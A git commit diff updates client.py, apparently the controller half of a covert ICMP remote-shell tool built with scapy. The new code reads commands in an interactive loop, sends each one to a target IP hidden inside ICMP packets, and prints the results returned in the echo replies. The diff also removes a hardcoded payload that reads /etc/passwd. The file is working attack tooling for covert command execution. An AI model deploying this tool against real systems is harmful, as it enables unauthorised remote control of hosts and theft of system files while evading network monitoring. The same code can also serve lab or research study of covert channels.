eb2411f70f503798de227ea2ee61454fddc46200
Diego Tellaroli <diegotellaroli05@gmail.com>
2024-05-13 16:39:54 -0300

    Update client.py

--- client.py
+++ client.py
@@ -1,18 +1,28 @@
 from scapy.all import *
+import sys
 
+def checkArgs(argv):
+    if len(argv) != 3:
+        print("[+] Error! Invalid arguments. Pass IP INTERFACE")
+        print("[+] Example: sudo python client.py 192.168.0.211 eth0")
+        quit()
 
 def receive_packet(packet):
     if ICMP in packet and packet[ICMP].type == 0:
         output = packet[Raw].load
         print(output.decode('utf-8'))
 
-# Define o destino do pacote ICMP
-target_ip = "192.168.0.211"  
-teste = "cat /etc/passwd" #payload a ser utilizado
+checkArgs(sys.argv)
 
+#destino do pacote icmp
+target_ip = sys.argv[1]
+interface = sys.argv[2] 
 
-icmp_packet = IP(dst=target_ip)/ICMP()/teste
+while True:
+    cmd = input("Command > ")
 
-# Envia o pacote ICMP
-send(icmp_packet, iface="wlp2s0")
-sniff(filter="icmp", prn=receive_packet)
+    icmp_packet = IP(dst=target_ip)/ICMP()/cmd
+
+    # Envia o pacote ICMP
+    send(icmp_packet, iface=interface)
+    sniff(filter="icmp", prn=receive_packet, count=1)
